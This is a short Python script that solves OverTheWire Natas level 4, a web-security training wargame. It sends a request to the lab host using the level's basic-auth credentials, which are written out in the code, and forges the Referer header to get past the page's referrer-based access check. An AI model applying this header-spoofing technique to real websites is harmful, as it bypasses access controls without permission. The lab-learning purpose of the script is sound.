# Python script for OverTheWire Natas level 4
#   1/21/2021 @ 18:51
#
#   resources: 
#       https://axcheron.github.io/writeups/otw/natas/
#       https://realpython.com/python-requests/

import requests

# Initializations
url = 'http://natas4.natas.labs.overthewire.org/'

# argument for "auth=" can't be a dictionary
login = ('natas4', 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')

# arguments for parameters are dictionaries
referrer = {'Referer': 'http://natas5.natas.labs.overthewire.org/'}


# Create a session
s = requests.Session()

# Connect the session to the url, using the auth and referrer header
x = requests.get(url, auth=login, headers=referrer);

print(x);
print(x.text);
